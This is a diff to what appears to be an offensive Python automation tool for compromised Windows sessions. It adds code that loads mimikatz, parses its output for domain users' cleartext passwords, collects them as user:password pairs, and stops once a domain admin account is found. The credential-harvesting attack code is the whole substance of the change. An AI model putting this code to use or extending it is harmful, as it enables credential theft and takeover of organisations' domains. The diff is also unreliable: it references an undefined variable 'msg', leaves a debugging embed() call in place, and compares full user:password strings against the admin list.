@@ -15,7 +15,7 @@ from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 
 NEW_SESS_DATA = {}
-DOMAIN_DATA = {'domain':None, 'domain_admins':[], 'domain_controllers':[], 'high_priority_ips':[]}
+DOMAIN_DATA = {'domain':None, 'domain_admins':[], 'domain_controllers':[], 'high_priority_ips':[], 'creds':[]}
 
 def parse_args():
     # Create the arguments
@@ -53,6 +53,7 @@ def print_great(msg, sess_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting...', None)
+    embed()
     for task in asyncio.Task.all_tasks():
         task.cancel()
 
@@ -299,6 +300,7 @@ def update_session(session, sess_num):
             NEW_SESS_DATA[sess_num][b'error'] = []
 
 async def run_mimikatz(client, sess_num):
+    global DOMAIN_DATA
 
     load_mimi_cmd = 'load mimikatz'
     load_mimi_end_strs = [b'Success.', b'has already been loaded.']
@@ -311,17 +313,31 @@ async def run_mimikatz(client, sess_num):
     if err:
         return 
     else:
-        mimikatz_utf8_out = mimikatz_output.decode('utf8')
-        mimikatz_split = mimikatz_utf8_out.splitlines()
+        mimikatz_split = mimikatz_output.splitlines()
         for l in mimikatz_split:
-            print_info(l.strip(), sess_num)
-            NEW_SESS_DATA[sess_num][b'mimikatz_output'] = mimikatz_split
+            if l.startswith(b'0;'):
+                line_split = l.split()
+                dom = line_split[2]
+                if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
+                    user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
+                    password = line_split[4]
+                    if b'wdigest KO' not in password:
+                        user_and_pass = '{}:{}'.format(user, password.decode('utf8'))
+                        if user_and_pass not in DOMAIN_DATA['creds']:
+                            DOMAIN_DATA['creds'].append(user_and_pass)
+                            print_good(msg, sess_num)
+                            check_for_DA(user_and_pass)
+
+def check_for_DA(user_and_pass):
+    if user_and_pass in DOMAIN_DATA['domain_admins']:
+        print_good('Domain admin found! {}'.format(user_and_pass))
+        kill_tasks()
+        sys.exit()
 
 async def gather_passwords(client, sess_num):
-    #mimikatz
+    await run_mimikatz(client, sess_num)
     #mimikittenz
     #hashdump
-    pass
 
 async def attack(client, sess_num):
 
